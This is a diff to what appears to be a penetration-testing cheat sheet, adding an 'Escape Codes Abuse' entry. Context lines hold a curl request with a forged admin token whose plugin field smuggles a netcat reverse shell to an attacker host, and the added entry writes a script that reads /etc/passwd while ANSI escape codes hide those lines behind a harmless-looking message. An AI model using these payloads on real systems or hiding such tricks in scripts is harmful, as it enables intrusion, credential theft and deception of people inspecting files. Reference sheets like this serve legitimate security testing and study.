@@ -12,6 +12,7 @@
 - [Bash Reverse Shell](#bash-reverse-shell)
 - [curl Reverse Shell](#curl-reverse-shell)
 - [Donut](#donut)
+- [Escape Codes Abuse](#escape-codes-abuse)
 - [Exiftool](#exiftool)
 - [GhostScript](#ghostscript)
 - [GIF](#gif)
@@ -248,6 +249,14 @@ $ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<
 
 ```c
 $ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
+```
+
+## Escape Codes Abuse
+
+> https://twitter.com/0xAsm0d3us/status/1774534241084445020
+
+```c
+$ echo -e '#!/bin/sh\ncat /etc/passwd\nexit\n\033[A\033[A\033[ATotally not malicious!"' > <FILE>.sh
 ```
 
 ## Exiftool
